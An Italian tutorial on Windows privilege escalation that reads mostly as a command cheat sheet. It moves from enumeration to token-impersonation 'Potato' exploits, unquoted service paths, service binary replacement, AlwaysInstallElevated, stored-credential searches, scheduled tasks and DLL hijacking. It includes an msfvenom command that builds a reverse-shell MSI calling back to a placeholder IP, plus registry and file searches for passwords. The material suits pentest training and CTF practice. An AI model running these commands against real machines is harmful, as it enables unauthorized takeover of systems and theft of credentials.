# Privilege Escalation su Windows: da utente a SYSTEM

## Introduzione

Hai una shell su una macchina Windows. L'utente corrente è `IIS APPPOOL\DefaultAppPool` oppure un utente di dominio a basso privilegio. Come sali a **SYSTEM** o **Administrator**?

La privilege escalation su Windows segue una logica simile a Linux — enumerazione sistematica, identificazione di debolezze di configurazione, sfruttamento — ma i meccanismi sono diversi.

---

## Enumerazione iniziale

```cmd
:: Chi sono?
whoami
whoami /priv          :: mostra i privilege tokens
whoami /groups        :: gruppi di appartenenza

:: Info sistema
systeminfo
hostname

:: Utenti del sistema
net users
net localgroup administrators

:: Processi in esecuzione
tasklist /v
tasklist /svc         :: processi con servizi associati

:: Servizi
sc query state= all
wmic service list brief

:: Rete
ipconfig /all
netstat -ano
route print

:: Applicazioni installate
wmic product get name,version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```

---

## Vettori comuni

### 1. Token Impersonation (SeImpersonatePrivilege)

Questo è il vettore più comune quando si ottiene una shell come service account (IIS, MSSQL, ecc.).

```cmd
whoami /priv
```

Se vedi `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege` abilitati, puoi usare **Potato exploits**:

- **JuicyPotato** — Windows Server 2008-2019 (no 2019 aggiornato)
- **PrintSpoofer** — Windows 10/2019
- **RoguePotato** — alternativa moderna

```cmd
:: PrintSpoofer
PrintSpoofer.exe -i -c cmd
:: → shell SYSTEM

:: JuicyPotato
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
```

GTFOBins Windows equivalent: **LOLBAS** (`lolbas-project.github.io`)

### 2. Unquoted Service Paths

Quando il percorso di un eseguibile di servizio contiene spazi e non è tra virgolette, Windows tenta path alternativi.

```cmd
:: Trova servizi con path senza virgolette
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```

Esempio vulnerabile:
```
C:\Program Files\My Service\service.exe
```

Windows prova in ordine:
1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My Service\service.exe`

Se puoi scrivere in `C:\Program Files\`, crei `My.exe` (una reverse shell), e al riavvio del servizio viene eseguita con i privilegi del servizio (spesso SYSTEM).

```cmd
:: Verifica permessi di scrittura
icacls "C:\Program Files\My Service"
```

### 3. Weak Service Permissions

Se hai permessi di modifica su un servizio (non solo sul suo file), puoi cambiare il binario che esegue.

```cmd
:: Controlla con accesschk (da Sysinternals)
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv USERNAME * /accepteula
```

```cmd
:: Cambia il binario del servizio
sc config NOME_SERVIZIO binpath= "C:\temp\shell.exe"
sc start NOME_SERVIZIO
```

### 4. AlwaysInstallElevated

Quando questa policy è abilitata, qualsiasi file `.msi` viene installato con privilegi SYSTEM.

```cmd
:: Verifica (entrambe devono essere 1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```bash
# Crea MSI malevolo con msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi > shell.msi
```

```cmd
:: Installa sul target
msiexec /quiet /qn /i shell.msi
```

### 5. Stored Credentials

```cmd
:: Credenziali salvate in Windows Credential Manager
cmdkey /list

:: Se ci sono credenziali salvate, usale con runas
runas /savecred /user:DOMAIN\Administrator cmd.exe

:: Cerca credenziali nei file di configurazione
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### 6. Scheduled Tasks

```cmd
:: Lista task schedulati
schtasks /query /fo LIST /v

:: Cerca task che eseguono script scrivibili
schtasks /query /fo LIST /v | findstr "Task To Run"
```

Se un task schedulato esegue un file che puoi modificare, sostituiscilo con una reverse shell.

### 7. DLL Hijacking

Windows cerca le DLL in un ordine preciso. Se un'applicazione privilegiata cerca una DLL che non trova, e tu controlli una delle directory di ricerca, puoi piazzare una DLL malevola.

```cmd
:: Procmon (Sysinternals) è il tool migliore per trovare DLL mancanti
:: Filtra per "NAME NOT FOUND" e "PATH NOT FOUND" nei log
```

---

## WinPEAS: automazione dell'enumerazione

Come LinPEAS per Linux, **WinPEAS** automatizza tutta l'enumerazione.

```cmd
:: Scarica e avvia
.\winPEASx64.exe

:: Output su file
.\winPEASx64.exe > output.txt
```

Colora i risultati in base alla criticità. I rossi vanno investigati per primi.

---

## Meterpreter: moduli post-exploitation

Con una sessione Meterpreter attiva:

```
meterpreter > run post/multi/recon/local_exploit_suggester
```

Questo modulo analizza il sistema e suggerisce exploit locali applicabili.

```
meterpreter > getsystem
```

Prova automaticamente diverse tecniche di privesc (named pipe, token duplication, ecc.).

---

## Conclusione

La privesc su Windows richiede familiarità con il sistema: come funzionano i servizi, i token, il registro, le policy. Non puoi memorizzare tutti i vettori — devi capire la logica di ogni categoria.

Risorse fondamentali:
- **LOLBAS** — `lolbas-project.github.io` — binari Windows abusabili
- **PayloadsAllTheThings** — cheat sheet completo su privesc Windows
- **TryHackMe** — room "Windows PrivEsc"
- **HackTheBox** — macchine Windows di difficoltà Easy/Medium
